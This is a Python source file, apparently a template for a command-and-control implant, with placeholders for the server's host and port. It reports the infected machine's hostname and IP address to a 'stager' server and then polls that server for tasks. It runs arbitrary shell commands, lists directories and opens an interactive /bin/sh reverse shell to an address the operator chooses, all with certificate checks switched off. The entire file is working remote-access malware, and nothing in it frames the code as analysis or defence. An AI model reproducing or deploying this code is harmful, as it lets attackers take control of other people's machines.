import multiprocessing
import os
import socket
import subprocess as sp
import time

import requests as r
import urllib3

{% if ssl %}
URL = "https://{{host}}:{{port}}/stager"
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
{% else %}
URL = "http://{{host}}:{{port}}/stager"
{% endif %}

def reverse_shell(address: str, port: int):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((address, int(port)))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    sp.call(["/bin/sh", "-i"])

data = {
    "address": socket.gethostbyname(socket.gethostname()),
    "hostname": sp.getoutput("hostname")
}
name = r.post(f"{URL}/connect", json=data, verify=False).text

while True:
    time.sleep(5)
    try:
        tasks = r.get(URL + "/tasks/" + name, verify=False)
    except:
        continue
    tasks = tasks.json()
    for task in tasks:
        if task["type"] in ["rce", "dir", "reverse-shell"]:
            data = {
                "id": task["id"],
                "success": True
            }
            if task["type"] == "rce":
                data["output"] = sp.getoutput(task["args"]["cmd"])
            elif task["type"] == "dir":
                data["output"] = sp.getoutput("ls " + task["args"]["dir"])
            elif task["type"] == "reverse-shell":
                multiprocessing.Process(target=reverse_shell, args=(
                    task["args"]["address"], task["args"]["port"])).start()
                data["output"] = "Send reverse shell"
            res = r.post(URL + "/finish/" + name, json=data, verify=False)
